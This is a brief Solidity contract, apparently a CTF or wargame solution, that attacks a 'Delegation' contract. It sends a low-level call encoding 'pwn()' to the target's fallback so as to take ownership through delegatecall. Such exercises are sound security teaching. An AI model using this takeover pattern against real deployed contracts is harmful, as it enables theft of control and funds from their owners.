// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Delegation.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        address(Delegation(contractAddress)).call{gas: 1000000}(
            abi.encodeWithSignature("pwn()")
        );
        // (bool result, bytes memory data) = address(Delegation(contractAddress))
        //     .call(abi.encodeWithSignature("pwn()"));
    }
}
